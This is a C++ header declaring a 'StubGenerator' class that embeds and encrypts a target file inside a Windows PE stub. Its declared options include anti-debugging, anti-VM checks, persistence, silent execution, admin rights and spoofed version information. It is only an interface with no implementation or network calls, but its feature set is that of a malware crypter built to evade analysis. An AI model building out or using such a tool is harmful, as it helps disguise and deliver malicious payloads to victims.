#pragma once

#include <string>
#include <vector>
#include <cstdint>
#include <memory>

// Stub configuration structure
struct StubConfig {
    std::string outputName = "output.exe";
    std::string iconPath = "";
    std::string versionInfo = "";
    bool addEncryption = true;
    bool addAntiDebug = true;
    bool addAntiVM = true;
    bool addPersistence = false;
    std::string encryptionKey = "";
    std::string targetFile = "";
    bool selfExtract = true;
    bool silentExecution = false;
    bool adminRights = false;
    std::string description = "Generated Application";
    std::string company = "Zencoder";
    std::string copyright = "Copyright (c) 2024";
    std::string originalFilename = "";
    std::string productName = "Zencoder Stub";
    std::string productVersion = "1.0.0.0";
    std::string fileVersion = "1.0.0.0";
};

// Stub generator class
class StubGenerator {
public:
    StubGenerator();
    ~StubGenerator();
    
    // Main generation methods
    bool generateStub(const StubConfig& config);
    bool attachFileToStub(const std::string& stubPath, const std::string& filePath, const std::string& outputPath);
    bool createSelfExtractingStub(const std::vector<std::string>& files, const StubConfig& config);
    
    // Configuration methods
    void setEncryptionKey(const std::string& key);
    void setTargetFile(const std::string& file);
    void enableAntiDebug(bool enable);
    void enableAntiVM(bool enable);
    void enablePersistence(bool enable);
    void setSilentExecution(bool silent);
    void setAdminRights(bool admin);
    
    // Utility methods
    std::vector<uint8_t> generateRandomKey(size_t length = 32);
    std::string generateUniqueId();
    bool validateConfig(const StubConfig& config);
    
    // File operations
    bool embedFile(const std::string& stubPath, const std::string& filePath);
    bool extractEmbeddedFile(const std::string& stubPath, const std::string& outputPath);
    std::vector<std::string> listEmbeddedFiles(const std::string& stubPath);
    
private:
    // Internal methods
    std::vector<uint8_t> generateStubCode(const StubConfig& config);
    std::vector<uint8_t> generatePEHeader();
    std::vector<uint8_t> generateResourceSection(const StubConfig& config);
    std::vector<uint8_t> generateCodeSection(const StubConfig& config);
    std::vector<uint8_t> generateDataSection(const std::vector<uint8_t>& embeddedData);
    
    // Anti-analysis code generation
    std::vector<uint8_t> generateAntiDebugCode();
    std::vector<uint8_t> generateAntiVMCode();
    std::vector<uint8_t> generatePersistenceCode();
    
    // Encryption methods
    std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data, const std::string& key);
    std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data, const std::string& key);
    
    // PE manipulation
    bool modifyPEHeader(std::vector<uint8_t>& peData, const StubConfig& config);
    bool addResourceToPE(std::vector<uint8_t>& peData, const std::vector<uint8_t>& resourceData);
    bool addSectionToPE(std::vector<uint8_t>& peData, const std::string& sectionName, const std::vector<uint8_t>& sectionData);
    
    // Member variables
    std::string m_encryptionKey;
    std::string m_targetFile;
    bool m_antiDebug;
    bool m_antiVM;
    bool m_persistence;
    bool m_silentExecution;
    bool m_adminRights;
};